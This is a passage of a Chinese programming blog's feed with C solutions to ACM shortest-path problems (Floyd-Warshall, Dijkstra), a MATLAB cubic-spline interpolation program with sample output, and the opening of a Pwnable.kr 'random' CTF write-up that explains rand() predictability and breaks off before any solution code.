<h2 id="Floyd-Warshall-算法"><a href="#Floyd-Warshall-算法" class="headerlink" title="Floyd-Warshall 算法"></a>Floyd-Warshall 算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 102</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"><span class="keyword">int</span> G[MAX][MAX];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> M = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G[i][j]);</div><div class="line">            <span class="keyword">if</span> ( G[i][j] == <span class="number">0</span>)</div><div class="line">                G[i][j] = INF;</div><div class="line">            <span class="keyword">if</span>  ( i == j )</div><div class="line">                G[i][j] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">    warshall_floyd();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            M = max(M, G[i][j]);</div><div class="line">    <span class="keyword">if</span> ( M  == INF)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, M<span class="number">-1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> k, i, j;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++)</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">                G[i][j] = min(G[i][j], G[i][k] + G[k][j]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? b : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;　　人肉搜索之所以强大，其原因在于世界上任何两个人，要么他们是朋友，要么他们是朋友的朋友，要么他们是朋友的朋友的朋友，要么他们是朋友的朋友的朋友的朋友，要么他们是朋友的朋友的朋友的朋友的朋友。。。人肉搜索引擎正是利用了这一点，对于每个问题，人肉搜索开始M层的搜索，第一层是搜索我的朋友，第二层是搜索我朋友的朋友，第三层是使搜索我朋友的朋友的朋友。。。给一个人际关系表，问M至少要为多少才能保证所有人之间可以通过人肉搜索引擎搜索到。&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="最短路径" scheme="http://yoursite.com/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>ACMXMU-OJ:1075</title>
    <link href="http://yoursite.com/2017/05/03/ACMXMU-OJ-1075/"/>
    <id>http://yoursite.com/2017/05/03/ACMXMU-OJ-1075/</id>
    <published>2017-05-03T14:46:10.000Z</published>
    <updated>2017-05-03T23:08:21.108Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>　　现在有个一个内部局域网络，里面有N台机器。为了某种安全原因的考虑，每两台机器之间的通讯都是经过加密的。由于不同机器之间传输的内容不同，所以他们通讯采用的加密级别也不大相同。不同的加密级别导致破解的难度不一样，越高的加密级别破解需要的时间也越多。如果我们获得了编号为i的机器的完全控制权，另外我们破解了机器i和机器j之间的加密信息，那么我们就得到了机器j的完全控制权。<br>　　现在你通过了某种手段入侵了1号机器，得到了这台机器的完全控制权。但是这个网络里面最重要的东西不在这台机器上，而在编号为N的机器上。由于需要破解加密信息才能控制其它机器，你又不想浪费太多时间在破解上，现在你来算算你至少需要多少时间才能得到编号为N的机器的完全控制权。</p>
<a id="more"></a>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>　　输入的第一行是一个正整数N(0 &lt; N &lt;= 100)，表示机器的数目。<br>　　输入的第二行开始到第N+1行，每行N个整数，第i+1行的第j个数字Tij表示破解机器i和机器j之间的加密算法所需要的时间，范围在[0..100,000]之间。另外Tij = Tji，Tii = 0。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>　　输出完全控制机器N的最少时间。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0 4 9 21<br>4 0 8 17<br>9 8 0 16<br>21 17 16 0</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>21</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>直接dijkstra。 采用邻接矩阵存储。</p>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;　　现在有个一个内部局域网络，里面有N台机器。为了某种安全原因的考虑，每两台机器之间的通讯都是经过加密的。由于不同机器之间传输的内容不同，所以他们通讯采用的加密级别也不大相同。不同的加密级别导致破解的难度不一样，越高的加密级别破解需要的时间也越多。如果我们获得了编号为i的机器的完全控制权，另外我们破解了机器i和机器j之间的加密信息，那么我们就得到了机器j的完全控制权。&lt;br&gt;　　现在你通过了某种手段入侵了1号机器，得到了这台机器的完全控制权。但是这个网络里面最重要的东西不在这台机器上，而在编号为N的机器上。由于需要破解加密信息才能控制其它机器，你又不想浪费太多时间在破解上，现在你来算算你至少需要多少时间才能得到编号为N的机器的完全控制权。&lt;/p&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="最短路径" scheme="http://yoursite.com/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>三次样条插值之MATLAB实现</title>
    <link href="http://yoursite.com/2017/04/09/%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2017/04/09/三次样条插值之MATLAB实现/</id>
    <published>2017-04-09T15:15:05.000Z</published>
    <updated>2017-04-09T15:23:32.376Z</updated>
    
    <content type="html"><![CDATA[<p>三次样条插值之MATLAB实现<br><a id="more"></a></p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">clear all</div><div class="line">x = input(<span class="string">'输入横坐标，格式:[x1 x2 …… xn]\n'</span>)</div><div class="line">y = input(<span class="string">'输入纵坐标，格式:[y1 y2 …… yn]\n'</span>)</div><div class="line">n = <span class="built_in">length</span>(x);</div><div class="line"></div><div class="line">flag = input(<span class="string">'请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :'</span>);</div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 一阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 一阶导数值：'</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 二阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 二阶导数值：'</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    h(<span class="built_in">i</span>) = x(<span class="built_in">i</span>+<span class="number">1</span>) -  x(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">fprintf(<span class="string">'计算 h 结果为:\n'</span>);</div><div class="line">h</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    u(<span class="built_in">i</span><span class="number">-1</span>) = h(<span class="built_in">i</span><span class="number">-1</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line">    lamda(<span class="built_in">i</span>) = h(<span class="built_in">i</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">1</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">1</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">0</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">0</span>;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 μ 结果为: \n'</span>);</div><div class="line">u</div><div class="line">fprintf(<span class="string">'计算 λ 结果为：\n'</span>);</div><div class="line">lamda</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    d(<span class="built_in">i</span>) = <span class="number">6</span> * ((y(<span class="built_in">i</span>+<span class="number">1</span>)-y(<span class="built_in">i</span>))/(x(<span class="built_in">i</span>+<span class="number">1</span>)-x(<span class="built_in">i</span>)) - (y(<span class="built_in">i</span>) - y(<span class="built_in">i</span><span class="number">-1</span>))/( x(<span class="built_in">i</span>) - x(<span class="built_in">i</span><span class="number">-1</span>)))/(h(<span class="built_in">i</span><span class="number">-1</span>)+h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">6</span> / h(<span class="number">1</span>) * (( y(<span class="number">2</span>)-y(<span class="number">1</span>) )/( x(<span class="number">2</span>) - x(<span class="number">1</span>) ) - y1_deri);</div><div class="line">    d(n) = <span class="number">6</span> / h(n<span class="number">-1</span>) * (yn_deri - ((y(n) - y(n<span class="number">-1</span>)) / ( x(n) - x(n<span class="number">-1</span>))));</div><div class="line"><span class="keyword">else</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">2</span> * y1_deri;</div><div class="line">    d(n) = <span class="number">2</span> * yn_deri;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 d 的结果：\n'</span>);</div><div class="line">d</div><div class="line"></div><div class="line">matrix1 = <span class="built_in">zeros</span>(n,n);</div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>) = <span class="number">2</span>;</div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>+<span class="number">1</span>) = lamda(<span class="built_in">i</span>);</div><div class="line">    matrix1(<span class="built_in">i</span>+<span class="number">1</span>,<span class="built_in">i</span>) = u(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">matrix1(n,n) = <span class="number">2</span>;</div><div class="line">matrix1;</div><div class="line"></div><div class="line">fprintf(<span class="string">'求得 M 结果:\n'</span>);</div><div class="line">M = matrix1\d'</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    clear S</div><div class="line">    syms t</div><div class="line">    k = x(<span class="built_in">i</span>):<span class="number">0.001</span>:x(<span class="built_in">i</span>+<span class="number">1</span>);</div><div class="line">    fprintf(<span class="string">'区间为[ %.3f : %.3f]\n'</span>,x(<span class="built_in">i</span>),x(<span class="built_in">i</span>+<span class="number">1</span>));</div><div class="line">    S = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-t)^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(t - x(<span class="built_in">i</span>))^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - t)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(t - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>)</div><div class="line">    s = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-k).^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(k - x(<span class="built_in">i</span>)).^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - k)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(k - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>);</div><div class="line">    hold on;</div><div class="line">    plot(k,s);</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>测试例题：《计算方法》（李庆扬版）P44 例7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; sanciyangtiao</div><div class="line">输入横坐标，格式:[x1 x2 …… xn]</div><div class="line">[27.7 28 29 30]</div><div class="line"></div><div class="line">x =</div><div class="line"></div><div class="line">   27.7000   28.0000   29.0000   30.0000</div><div class="line"></div><div class="line">输入纵坐标，格式:[y1 y2 …… yn]</div><div class="line">[4.1 4.3 4.1 3.0]</div><div class="line"></div><div class="line">y =</div><div class="line"></div><div class="line">    4.1000    4.3000    4.1000    3.0000</div><div class="line"></div><div class="line">请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1</div><div class="line">x1 的 一阶导数值：3.0</div><div class="line">xn 的 一阶导数值：-4.0</div><div class="line">计算 h 结果为:</div><div class="line"></div><div class="line">h =</div><div class="line"></div><div class="line">    0.3000    1.0000    1.0000</div><div class="line"></div><div class="line">计算 μ 结果为:</div><div class="line"></div><div class="line">u =</div><div class="line"></div><div class="line">    0.2308    0.5000    1.0000</div><div class="line"></div><div class="line">计算 λ 结果为：</div><div class="line"></div><div class="line">lamda =</div><div class="line"></div><div class="line">    1.0000    0.7692    0.5000</div><div class="line"></div><div class="line">计算 d 的结果：</div><div class="line"></div><div class="line">d =</div><div class="line"></div><div class="line">  -46.6667   -4.0000   -2.7000  -17.4000</div><div class="line"></div><div class="line">求得 M 结果:</div><div class="line"></div><div class="line">M =</div><div class="line"></div><div class="line">  -23.5314</div><div class="line">    0.3960</div><div class="line">    0.8297</div><div class="line">   -9.1149</div><div class="line"></div><div class="line">区间为[ 27.700 : 28.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010</div><div class="line"></div><div class="line">区间为[ 28.000 : 29.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030</div><div class="line"></div><div class="line">区间为[ 29.000 : 30.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/MATLAB/1.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;三次样条插值之MATLAB实现&lt;br&gt;
    
    </summary>
    
      <category term="Course" scheme="http://yoursite.com/categories/Course/"/>
    
    
      <category term="计算方法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"/>
    
      <category term="matlab" scheme="http://yoursite.com/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:random</title>
    <link href="http://yoursite.com/2017/04/09/Pwnable-kr-random/"/>
    <id>http://yoursite.com/2017/04/09/Pwnable-kr-random/</id>
    <published>2017-04-09T01:31:08.000Z</published>
    <updated>2017-04-09T04:47:54.508Z</updated>
    
    <content type="html"><![CDATA[<p>伪随机<br><a id="more"></a></p>
<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>先file看一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/1.jpg?raw=true" alt=""></p>
<p>IDA打开</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/2.jpg?raw=true" alt=""></p>
<p>可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为  0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。</p>
<h1 id="rand（）"><a href="#rand（）" class="headerlink" title="rand（）"></a>rand（）</h1><p>rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。</p>
<p>C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下：</p>
